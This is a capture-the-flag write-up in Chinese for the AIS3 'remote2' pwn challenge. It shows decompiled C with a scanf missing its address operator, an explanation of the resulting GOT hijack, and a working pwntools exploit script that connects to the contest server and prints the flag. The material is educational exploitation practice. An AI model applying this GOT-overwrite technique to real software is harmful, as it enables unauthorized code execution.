# remote2

反編譯後的原始碼如下：

``` c
char buf1[0x2000], buf2[0x2000];

int ask_secret()
{
  int secret1; // [sp+18h] [bp-10h]@0
  int secret2; // [sp+1Ch] [bp-Ch]@0

  printf("Enter secret #1: ");
  fflush(stdout);
  scanf("%d", secret1);
  printf("Enter secret #2: ");
  fflush(stdout);
  scanf("%d", secret2);
  puts("Checking ...");
  if ( secret1 != 0xDEADBEEF || secret2 != 0x2016A153 )
  {
    puts("Registration failed!");
    exit(0);
  }
  puts("Login success!");
  return system("/bin/cat flag.txt");
}

void ask_name()
{
  char buffer[100]; // [sp+18h] [bp-70h]@1

  printf("Show me your name: ");
  fflush(stdout);
  scanf("%100s", buffer);
  printf("Welcome %s!\n\n", buffer);
}

int main()
{
  char *home_path; // [sp+1Ch] [bp-4h]@1

  home_path = getenv("HOME");
  if ( home_path ) chdir(home_path);
  setvbuf(stdin, buf1, 1, 0x2000u);
  setvbuf(stdout, buf2, 1, 0x2000u);
  puts("Welcome to AIS3 online registration system!\n");
  ask_name();
  ask_secret();
  puts("Good job!");
  return 0;
}
```

這題主要的問題是，`scanf` 的時候沒有使用 `&` 取 address，並且變數未初始化，因此可控制

`ask_name` 時， `&buffer[96]` == `&secret1`，在 `secret1` 填入 `scanf.GOT` 做 GOT hijack

``` python
from pwn import *

io = remote('quiz.ais3.org', 53125)

io.recvuntil('Show me your name: ')
io.sendline('A' * 96 + p32(0x0804A038))
io.recvuntil('Enter secret #1: ')
io.sendline(str(0x080486e5))
io.recvuntil('Enter secret #2: ')
print io.recv()
```

`ais3{don't_IGNORE_cOmPiLEr_WARNINGS!!!}`
